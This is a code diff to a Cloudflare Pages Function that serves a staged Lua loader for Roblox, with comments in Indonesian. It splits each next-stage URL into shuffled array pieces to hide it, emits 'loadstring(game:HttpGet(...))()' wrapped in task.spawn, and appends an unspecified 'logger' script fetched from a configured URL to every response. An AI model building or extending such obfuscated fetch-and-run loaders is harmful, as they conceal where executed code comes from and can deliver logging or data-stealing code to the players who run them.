@@ -1,3 +1,6 @@
+// functions/api/loader/[[path]].js - Cloudflare Pages Functions
+// LOADER DENGAN MULTI-LAYER PROTECTION MENGGUNAKAN KV (Binding: ndraawzontop)
+
 import kvHelper from '../../helper/kv-helper.js';
 
 const SETTINGS = {
@@ -104,7 +107,11 @@ function obfuscateUrl(url) {
     // Concat acak
     const concatStr = orderMap.map(i => `${varName}[${i}]`).join('..');
 
-    return `local ${varName}={${arrayStr}}loadstring(game:HttpGet(${concatStr}))()`;
+    // ========== BUNGKUS DENGAN TASK.SPAWN ==========
+    return `task.spawn(function()
+local ${varName}={${arrayStr}}
+loadstring(game:HttpGet(${concatStr}))()
+end)`;
 }
 
 // ========== HANDLER CLOUDFLARE PAGES ==========
@@ -304,7 +311,9 @@ export async function onRequest(context) {
             const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
             const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
 
-            const luaScript = obfuscateUrl(nextUrl) + "\n" + (loggerScript || '');
+            // ========== BUNGKUS DENGAN TASK.SPAWN ==========
+            const obfuscatedUrl = obfuscateUrl(nextUrl);
+            const luaScript = obfuscatedUrl + "\n" + (loggerScript || '');
             return new Response(luaScript, {
                 status: 200,
                 headers
@@ -331,4 +340,4 @@ export async function onRequest(context) {
             headers
         });
     }
-        }
+    }
